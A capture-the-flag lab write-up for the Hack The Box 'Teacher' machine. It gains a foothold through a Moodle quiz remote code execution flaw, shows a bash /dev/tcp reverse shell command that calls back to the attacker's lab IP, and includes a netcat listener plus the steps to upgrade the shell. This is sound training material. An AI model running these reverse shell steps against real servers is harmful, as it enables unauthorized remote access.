# Foothold
## Getting reverse shell
- Fom the exploit described by [ripstech](https://blog.ripstech.com/2018/moodle-remote-code-execution/), we can create a quiz.
- We can first check if `ping -c 1 10.10.14.12` is working or not.
```bash
 sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
09:35:15.237927 IP 10.10.10.153 > 10.10.14.12: ICMP echo request, id 882, seq 1, length 64
09:35:15.237980 IP 10.10.14.12 > 10.10.10.153: ICMP echo reply, id 882, seq 1, length 64
09:35:15.412755 IP 10.10.10.153 > 10.10.14.12: ICMP echo request, id 884, seq 1, length 64
09:35:15.412804 IP 10.10.14.12 > 10.10.10.153: ICMP echo reply, id 884, seq 1, length 64
09:35:21.773372 IP 10.10.10.153 > 10.10.14.12: ICMP echo request, id 886, seq 1, length 64
09:35:21.773407 IP 10.10.14.12 > 10.10.10.153: ICMP echo reply, id 886, seq 1, length 64
09:35:21.978014 IP 10.10.10.153 > 10.10.14.12: ICMP echo request, id 888, seq 1, length 64
09:35:21.978046 IP 10.10.14.12 > 10.10.10.153: ICMP echo reply, id 888, seq 1, length 64
^C
8 packets captured
8 packets received by filter
0 packets dropped by kernel

```

- We can create a reverse shell request `bash -c 'bash -i >& /dev/tcp/10.10.14.12'` to get a reverse shell.
![[Pasted image 20210418100615.png]]
```bash
nc -lnvp 9001                                                                           1 ↵ 
listening on [any] 9001 ...                                                                     
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.153] 60142                                    
bash: cannot set terminal process group (829): Inappropriate ioctl for device                   
bash: no job control in this shell                                                              
www-data@teacher:/var/www/html/moodle/question$ python3 -c 'import pty;pty.spawn("/bin/bash")'  
<ion$ python3 -c 'import pty;pty.spawn("/bin/bash")'                                            
www-data@teacher:/var/www/html/moodle/question$ ^Z
[1]  + 2669 suspended  nc -lnvp 9001
╭─norman@kali ~/Hack-The-Box/machines/teacher ‹main*› 
╰─$ stty raw -echo; fg                                                                    148 ↵
[1]  + 2669 continued  nc -lnvp 9001

...[Press RET twice]...

```

